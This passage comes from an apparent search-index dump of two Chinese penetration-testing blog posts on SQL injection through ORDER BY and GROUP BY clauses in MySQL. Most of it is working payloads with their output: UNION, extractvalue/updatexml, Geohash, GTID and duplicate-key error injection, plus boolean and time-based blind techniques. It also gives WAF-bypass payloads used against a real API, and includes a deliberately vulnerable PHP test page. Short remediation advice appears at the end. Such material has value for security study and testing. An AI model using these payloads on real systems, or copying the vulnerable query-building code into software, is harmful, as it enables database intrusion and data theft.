admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | | 13 | admin1 | admin3 | +----+----------+------------+ 14 rows in set (0.01 sec) # 自建数据库，版本8.0.31 mysql\u003e select * from users; +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | +----+--------+----------+------+-----------+ 4 rows in set (0.01 sec) ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:1","tags":["SQLi"],"title":"019-SQL注入之OrderBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"2、获取字段数 Order by 后面加数字就能进行字段数的枚举，当数字大于字段数时，就会产生类似如下报错： mysql\u003e select * from users order by 5; +----+-------+----------+------+-----------+ | id | name | pass | age | area | +----+-------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 3 | user1 | qwer1234 | 28 | guangzhou | | 2 | test2 | 543210 | 20 | shanghai | +----+-------+----------+------+-----------+ 3 rows in set (0.00 sec) mysql\u003e select * from users order by 6; ERROR 1054 (42S22): Unknown column '6' in 'order clause' ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:2","tags":["SQLi"],"title":"019-SQL注入之OrderBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"3、联合注入(罕见) order by位置后无法接union select，语法不支持，报错如下。 mysql\u003e select * from users order by id union select 1,2,3,4,5; ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'union select 1,2,3,4,5' at line 1 但是有一种情况，可能可以用，即前一句SQL语句整体处在括号中。如下： mysql\u003e (select * from users order by id); +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | +----+--------+----------+------+-----------+ 4 rows in set (0.01 sec) mysql\u003e (select * from users order by id) union select 1,2,3,4,5; +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | | 1 | 2 | 3 | 4 | 5 | +----+--------+----------+------+-----------+ 5 rows in set (0.01 sec) 这种情况非常罕见，利用条件比较苛刻。 mysql\u003e (select * from users order by id) union select 1,user(),3,4,version(); +----+----------------+----------+------+-----------+ | id | name | pass | age | area | +----+----------------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | | 1 | root@127.0.0.1 | 3 | 4 | 8.0.31 | +----+----------------+----------+------+-----------+ 5 rows in set (0.01 sec) ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:3","tags":["SQLi"],"title":"019-SQL注入之OrderBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"4、报错注入 如果列名可控，即为 ?orderby=id的情况： 1）XPath报错 mysql\u003e select * from users order by id/extractvalue(1,concat('~',(select version()))); ERROR 1105 (HY000): XPATH syntax error: '~8.0.31' mysql\u003e select * from users order by id/updatexml(1,concat(0x7e,(select version()),0x7e),1); ERROR 1105 (HY000): XPATH syntax error: '~8.0.31~' 2）Geohash报错 # mysql 5.7.26 mysql\u003e select * from users order by users.id/(ST_LongFromGeoHash((select version()))); ERROR 1411 (HY000): Incorrect geohash value: '5.7.26' for function ST_LONGFROMGEOHASH mysql\u003e mysql\u003e select * from users order by users.id/(ST_PointFromGeoHash((select version()),1)); ERROR 1210 (HY000): Incorrect arguments to / mysql\u003e mysql\u003e select * from users order by users.id/(ST_LatFromGeoHash((select version()))); ERROR 1411 (HY000): Incorrect geohash value: '5.7.26' for function ST_LATFROMGEOHASH mysql\u003e # mysql 8.0.31 mysql\u003e select * from users order by id/(ST_LongFromGeoHash((select version()))); ERROR 1411 (HY000): Incorrect geohash value: '8.0.31' for function ST_LONGFROMGEOHASH mysql\u003e mysql\u003e select * from users order by id/(ST_PointFromGeoHash((select version()),1)); ERROR 1210 (HY000): Incorrect arguments to / mysql\u003e mysql\u003e select * from users order by id/(ST_LatFromGeoHash((select version()))); ERROR 1411 (HY000): Incorrect geohash value: '8.0.31' for function ST_LATFROMGEOHASH 3）GTID报错 # mysql 5.7.26 mysql\u003e select * from users where username like 'admin%' order by users.id/(gtid_subtract(version(),1)); ERROR 1772 (HY000): Malformed GTID set specification '5.7.26'. mysql\u003e mysql\u003e select * from users where username like 'admin%' order by users.id/(gtid_subset(version(),1)); ERROR 1772 (HY000): Malformed GTID set specification '5.7.26'. mysql\u003e # mysql 8.0.31 mysql\u003e select * from users order by users.id/(gtid_subtract(version(),1)); ERROR 1772 (HY000): Malformed GTID set specification '8.0.31'. mysql\u003e mysql\u003e select * from users order by users.id/(gtid_subset(version(),1)); ERROR 1772 (HY000): Malformed GTID set specification '8.0.31'. 4）Duplicate key报错 # mysql 5.8.26 mysql\u003e select * from users where username like 'admin%' order by (select 1 from (select count(*),concat(version(),'~',floor(rand(0)*2))x from information_schema.tables group by x)a); ERROR 1062 (23000): Duplicate entry '5.7.26~1' for key '\u003cgroup_key\u003e' mysql\u003e select * from users where username like 'admin%' order by (select count(*) from information_schema.tables group by concat((select version()),0x7e,floor(rand(0)*2))); ERROR 1062 (23000): Duplicate entry '5.7.26~1' for key '\u003cgroup_key\u003e' mysql 8.0.31不适用 mysql\u003e select * from users order by (select 1 from (select count(*),concat(version(),'~',floor(rand(0)*2))x from information_schema.tables group by x)a); ERROR 1242 (21000): Subquery returns more than 1 row ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:4","tags":["SQLi"],"title":"019-SQL注入之OrderBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"5、布尔盲注 1）IF 利用if语句 # 前面等式成立则按id列进行排序，不成立则按age列进行排序。 mysql\u003e select * from users order by if(1=0,id,age); +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 4 | aduser | 123456 | 10 | beijing | | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | +----+--------+----------+------+-----------+ 4 rows in set (0.01 sec) mysql\u003e select * from users order by if(1=1,id,age); +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | +----+--------+----------+------+-----------+ 4 rows in set (0.00 sec) 可以看到这种方法，必须要知道列名，利用还是有条件的。 mysql\u003e select * from users order by if((substr(version(),1,1)='8'),id,age); +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | +----+--------+----------+------+-----------+ 4 rows in set (0.01 sec) mysql\u003e select * from users order by if((substr(version(),1,1)='6'),id,age); +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 4 | aduser | 123456 | 10 | beijing | | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | +----+--------+----------+------+-----------+ 4 rows in set (0.01 sec) 网上有些文章直接用数字代替列名，如if(1=1,1,4)，但是本地测试时两个版本都没有成功。如下： 2）rand 利用rand() true和false返回顺序不同进行盲注。 order by rand(1) order by rand(0) order by rand(substr(version(),1,1)='8') 3）位运算符 位运算符，主要使用^异或运算，其他也可 order by id^0; order by id^1; select * from users order by id^(substr(version(),1,1)='8');select * from users order by id^(substr(version(),1,1)='6'); order by id^(select (select version()) regexp '^5');order by id^(select (select version()) regexp 0x5e35); # 0x5e35 \u003c-\u003e hex('^5') # 注意 regexp 在不同版本下对十六进制匹配会有些微小的差异 ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:5","tags":["SQLi"],"title":"019-SQL注入之OrderBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"6、时间盲注 order by会根据数据记录数把延时放大，比如sleep 1秒，有3条记录，则总共延时 3秒。 mysql\u003e select * from users order by sleep(1); +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | +----+--------+----------+------+-----------+ 4 rows in set (4.02 sec) mysql\u003e select * from users order by id,if((substr(version(),1,1)=8),sleep(1),0); +----+--------+----------+------+-----------+ | id | name | pass | age | area | +----+--------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | | 4 | aduser | 123456 | 10 | beijing | +----+--------+----------+------+-----------+ 4 rows in set (4.01 sec) ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:6","tags":["SQLi"],"title":"019-SQL注入之OrderBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"修复建议 要防止sql注入攻击，建议采取以下措施： 1、使用参数绑定或预编译语句：使用参数化查询或预编译语句，将用户提供的输入作为参数传递给SQL查询，而不是将其直接拼接到查询字符串中。这样可以防止恶意输入被解释为SQL代码。 2、输入验证和过滤：对于动态生成的列名或表达式，确保对用户输入进行严格的验证和过滤，只允许合法的值和字符，避免将恶意输入传递给SQL查询。 3、最小权限原则：在数据库的访问控制上，确保应用程序使用的数据库账户具有最小的权限，仅限于执行必要的操作，以减少潜在的攻击面。 对于无法直接进行预编译的内容，需要在代码层进行过滤和处理，比如可以通过映射的方式将前端接收的参数值匹配到后端相应的值，再传入SQL进行操作，从而避免将恶意输入传递给SQL查询。 以上就是本次分享全部内容，如有纰漏，欢迎各位大佬交流指正。 微信扫一扫，关注该公众号 ","date":"2023-07-28","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:3:0","tags":["SQLi"],"title":"019-SQL注入之OrderBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"本篇文章作者Xavier，本文属i春秋原创奖励计划，首发于i春秋论坛，未经许可禁止转载。 原文地址：https://bbs.ichunqiu.com/thread-63490-1-1.html ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:0:0","tags":["SQLi"],"title":"018-SQL注入之GroupBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"Group by 简介 GROUP BY 语句将具有相同值的行分组为汇总行，例如\"查找每个地区的客户数量\"。 GROUP BY 语句通常与聚合函数（COUNT()、MAX(), MIN(), SUM(), AVG()) 按一列或多列对结果集进行分组。 ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:1:0","tags":["SQLi"],"title":"018-SQL注入之GroupBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"GROUP BY 语法 SELECT column_name, function(column_name) FROM table_name WHERE column_name operator value GROUP BY column_name HAVING condition ORDER BY column_name LIMIT num; 在GROUP BY子句中，列出了要用于分组的列名。查询结果将根据这些列的值进行分组，具有相同值的行将被归为一组。然后，对于每个组，可以使用聚合函数来计算汇总值。 ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:1:1","tags":["SQLi"],"title":"018-SQL注入之GroupBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"使用场景 1）查询每个顾客的订单总额 例如，假设有一个Orders表包含以下列：OrderID、CustomerID、OrderDate和TotalAmount。我们可以使用GROUP BY语句按CustomerID对订单进行分组，并计算每个客户的订单总金额： SELECT CustomerID, SUM(TotalAmount) AS TotalSum FROM Orders GROUP BY CustomerID; 以上查询将返回每个客户的CustomerID和对应的订单总金额TotalSum。 需要注意的是，使用GROUP BY语句时，SELECT子句中的列必须是分组列或聚合函数的结果列。如果在SELECT子句中引用了其他列，则这些列必须在GROUP BY子句中列出。 GROUP BY语句可以用于多个列的组合分组，例如： SELECT CustomerID, SUM(TotalAmount) AS TotalSum FROM Orders GROUP BY CustomerID; 以上查询将按Country和City两列进行分组，并计算每个组的记录数。 总之，GROUP BY语句在SQL中用于按照指定的列对结果进行分组，并进行聚合计算，以便更好地理解和分析数据。 2）统计员工数量最多的5个部门 统计每个部门的员工数量，并按照员工数量降序排序，只返回前5个部门： SELECT department, COUNT(*) as total_employees FROM employees GROUP BY department ORDER BY total_employees DESC LIMIT 5; 3）统计不同部门的员工总数和平均薪资 查询不同部门的员工总数和平均工资，并将结果合并： SELECT department, COUNT(*) as total_employees, AVG(salary) as avg_salary FROM employees GROUP BY department UNION SELECT 'Overall', COUNT(*), AVG(salary) FROM employees; ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:1:2","tags":["SQLi"],"title":"018-SQL注入之GroupBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"GROUP BY 注入 上面给了几个group by的使用场景，GROUP BY子句后面的参数是用于指定列名或表达式，以对结果进行分组。这些参数通常是SQL查询的一部分，与order by 一样，无法直接预编译，因此也容易出现SQL注入。 只不过相比于order by位置点的注入，group by位置点更少见一些。 ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:0","tags":["SQLi"],"title":"018-SQL注入之GroupBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"案例 最近帮朋友看了个注入点，是一个Groupby注入点 /api?pageSize=-1\u0026groupBy=id 在groupby参数的id加上单引号，引起报错，泄露SQL语句 可以看到这里的group by 是存在拼接的，这个id是可控的，很明显是一个注入点。 把SQL语句简化以下就是： select 1,2,3...,17 from table were table.a is null group by table.id 这其中的id是可控的，传进去就会与table.进行拼接，像这个group by位置的注入点，我很少有见到。 先说结果，注出来了，有waf，最后的几种payload: # 转换成order by，利用rand()进行条件布尔注入：id order by rand(substr(version(),1,1)='8')，url编码绕过waf id+order+by+rand(%73%75%62%73%74%72%28%76%65%72%73%69%6f%6e%28%29,1,1)='8') # 报错注入，id and extractvalue(0x5c,concat(1,(select version()))) id/**/and/**/extractvalue(0x5c,concat('~',/*!60000select*//**/version())) # 报错注入， id/**/and/**/updatexml(1,concat(0x7e,(/*!12345select*//**/version()),0x7e),1) 布尔注入的顺序会不同，得出版本： 这里我字符加少了，只加了数字0-9，字母a-f，和符号.号，但版本的话大部分情况下数字0-9，加上符号点号.，够用了。如果是数据库名的话，想要全一点就是大小写字母+数字+短杠和下划线。 报错注入截图： extractvalue语句： updatexml语句： ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:1","tags":["SQLi"],"title":"018-SQL注入之GroupBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"本地环境 因为group by后面的注入点之前没怎么遇到过，这次就顺便研究下，在本地数据库mysql下进行测试。 改了下sqli-labs做案例，新建了一个less，代码如下： \u003c?php include(\"../sql-connections/sql-connect.php\"); error_reporting(0); if(isset($_GET['groupby'])) { $groupby=$_GET['groupby']; $sql=\"select * from users where username like 'admin%' group by $groupby \"; #$sql=\"select * from users where username like 'admin%' group by user.$groupby \"; $result=mysql_query($sql); echo $sql.'\u003cbr\u003e'; if($result){ $rows = mysql_num_rows($result); echo '查询结果共有'.$rows.'条记录\u003cbr\u003e'; echo \"\u003ctable\u003e \u003ctr\u003e \u003cth\u003e序号\u003c/th\u003e \u003cth\u003e姓名\u003c/th\u003e \u003cth\u003e密码\u003c/th\u003e \u003ctr\u003e\"; if($rows\u003e0){ $count = 1; while($row = mysql_fetch_assoc($result)){ echo \"\u003ctr\u003e \u003ctd\u003e\".$row['id'].\"\u003c/td\u003e \u003ctd\u003e\".$row['username'].\"\u003c/td\u003e \u003ctd\u003e\".$row['password'].\"\u003c/td\u003e \u003c/tr\u003e\"; } $count++; } echo \"\u003c/table\u003e\"; }else { echo '\u003cfont color= \"#FFFF00\"\u003e'; print_r(mysql_error()); echo \"\u003c/font\u003e\"; } } else { echo \"Please input the ID as parameter with numeric value\";} ?\u003e 下面演示用到了两个数据表。 # sqli-labs 数据库，版本5.7.26 mysql\u003e select * from users; +----+----------+------------+ | id | username | password | +----+----------+------------+ | 1 | Dumb | Dumb | | 2 | Angelina | I-kill-you | | 3 | Dummy | p@ssword | | 4 | secure | crappy | | 5 | stupid | stupidity | | 6 | superman | genious | | 7 | batman | mob!le | | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 12 | dhakkan | dumbo | | 14 | admin4 | admin4 | +----+----------+------------+ 13 rows in set (0.02 sec) # 自建数据库，版本8.0.31 mysql\u003e select * from users; +----+-------+----------+------+-----------+ | id | name | pass | age | area | +----+-------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | +----+-------+----------+------+-----------+ 3 rows in set (0.01 sec) ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:2","tags":["SQLi"],"title":"018-SQL注入之GroupBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"获取字段数 group by 后面加数字就能进行字段数的枚举，当数字大于字段数时，就会产生如下报错： # mysql 8.0.31 mysql\u003e select * from users where id=2 group by 5; +----+-------+--------+------+----------+ | id | name | pass | age | area | +----+-------+--------+------+----------+ | 2 | test2 | 543210 | 20 | shanghai | +----+-------+--------+------+----------+ 1 row in set (0.02 sec) mysql\u003e select * from users where id=2 group by 6; ERROR 1054 (42S22): Unknown column '6' in 'group statement' 还有一种报错情况，如下： # mysql 5.7.26 mysql\u003e select * from users where username like 'admin%' group by 1; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 14 | admin4 | admin4 | +----+----------+----------+ 5 rows in set (0.00 sec) mysql\u003e select * from users where username like 'admin%' group by 2; ERROR 1055 (42000): Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'security.users.id' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by mysql\u003e select * from users where username like 'admin%' group by 3; ERROR 1055 (42000): Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column 'security.users.id' which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by mysql\u003e select * from users where username like 'admin%' group by 4; ERROR 1054 (42S22): Unknown column '4' in 'group statement' mysql\u003e 这个错误提示是由于MySQL的sql_mode配置中启用了only_full_group_by模式，它要求在使用GROUP BY子句时，SELECT列表中的非聚合列必须包含在GROUP BY子句中。 上述案例中id是非聚合列，所以必须要带上，如下： 还有一种情况， group by后面的参数只能控制一部分，比如如下sql语句： $sql=\"select * from users where username like 'admin%' group by user.$groupby \"; $result=mysql_query($sql); 像案例中就是这种情况，这种情况下获取列名只能先闭合前面的列名，然后遍历第二位的数字，如下： mysql\u003e select * from users where username like 'admin%' group by users.id,3; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 14 | admin4 | admin4 | +----+----------+----------+ 5 rows in set (0.00 sec) mysql\u003e select * from users where username like 'admin%' group by users.id,4; ERROR 1054 (42S22): Unknown column '4' in 'group statement' ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:3","tags":["SQLi"],"title":"018-SQL注入之GroupBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"联合查询 接下来看下联合查询的情况 众所周知，Where 后的注入点可以用 union select 联合查询，并且能控制回显位置。那么group by呢？ Group by 后面可以接union select，但无法控制回显位置。 但但是，group by用于分类查询，limit语句只能放在后面位置，可以通过注释符注释掉它。 例如，我们需要查询前3个用户名为admin开头的 mysql\u003e select * from users where username like 'admin%' group by id limit 3; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | +----+----------+----------+ 3 rows in set (0.01 sec) mysql\u003e select * from users where username like 'admin%' group by id union select 1,2,3; -- limit 3; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 8 | admin | admin | | 9 | admin1 | admin1 | | 10 | admin2 | admin2 | | 11 | admin3 | admin3 | | 14 | admin4 | admin4 | | 1 | 2 | 3 | +----+----------+----------+ 6 rows in set (0.01 sec) 修改PHP SQL查询语句： $sql=\"select * from users where username like 'admin%' group by $groupby limit 3\"; $result=mysql_query($sql); 试着在group by后面拼接union select成功： Payload:groupby=id union select 1,user(),version() ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:4","tags":["SQLi"],"title":"018-SQL注入之GroupBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"报错注入 报错注入也简单，直接在group by后续位置插入报错语句即可： XPath报错 mysql\u003e select * from users group by 1,(extractvalue(1,concat('~',(select version())))); ERROR 1105 (HY000): XPATH syntax error: '~8.0.31' mysql\u003e mysql\u003e select * from users group by 1, (updatexml(1,concat(0x7e,(select version()),0x7e),1)); ERROR 1105 (HY000): XPATH syntax error: '~8.0.31~' mysql\u003e Geohash报错 Geohash报错在5.7.26上成功了，但是在8.0.31上失败了 # mysql 5.7.26 mysql\u003e select * from users where username like 'admin%' group by users.id,1,(ST_LongFromGeoHash((select version()))); ERROR 1411 (HY000): Incorrect geohash value: '5.7.26' for function ST_LONGFROMGEOHASH mysql\u003e select * from users where username like 'admin%' group by users.id,1,(ST_PointFromGeoHash((select version()),1)); ERROR 1411 (HY000): Incorrect geohash value: '5.7.26' for function st_pointfromgeohash mysql\u003e select * from users where username like 'admin%' group by users.id,1,(ST_LatFromGeoHash((select version()))); ERROR 1411 (HY000): Incorrect geohash value: '5.7.26' for function ST_LATFROMGEOHASH mysql\u003e # mysql 8.0.31 失败 mysql\u003e select * from users where id=2 group by 1,(ST_LongFromGeoHash((select version()))); +----+-------+--------+------+----------+ | id | name | pass | age | area | +----+-------+--------+------+----------+ | 2 | test2 | 543210 | 20 | shanghai | +----+-------+--------+------+----------+ 1 row in set (0.01 sec) GTID报错 mysql 5.7.26上成功了 # mysql 5.7.26 mysql\u003e select * from users where username like 'admin%' group by users.id,(gtid_subtract(version(),1)); ERROR 1772 (HY000): Malformed GTID set specification '5.7.26'. mysql\u003e select * from users where username like 'admin%' group by users.id,(gtid_subset(version(),1)); ERROR 1772 (HY000): Malformed GTID set specification '5.7.26'. mysql 8.0.31失败 ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:5","tags":["SQLi"],"title":"018-SQL注入之GroupBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"布尔盲注 布尔盲注这块，没想到其他办法，一种是利用union select 另一种是利用order by 的布尔盲注实现。 id order by rand(substr(version(),1,1)='8') 因为group by后面可以接order by，所以适用于order by注入点的方法都可以用。 ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:6","tags":["SQLi"],"title":"018-SQL注入之GroupBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"时间盲注 时间盲注想到的办法也是union select 和 order by，但是需要注意的是 order by会根据数据记录数把延时放大，比如sleep 1秒，有3条记录，则总共延时 3秒。 mysql\u003e select * from users group by 1 order by sleep(1); +----+-------+----------+------+-----------+ | id | name | pass | age | area | +----+-------+----------+------+-----------+ | 1 | test1 | 123456 | 18 | beijing | | 2 | test2 | 543210 | 20 | shanghai | | 3 | user1 | qwer1234 | 28 | guangzhou | +----+-------+----------+------+-----------+ 3 rows in set (3.01 sec) 所以这种方法不推荐使用，尤其是查询大型数据库。 ","date":"2023-07-27","objectID":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/:2:7","tags":["SQLi"],"title":"018-SQL注入之GroupBy位置点注入","uri":"/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/"},{"categories":["Pentest"],"content":"总结 要防止SQL注入攻击，建议采取以下措施： 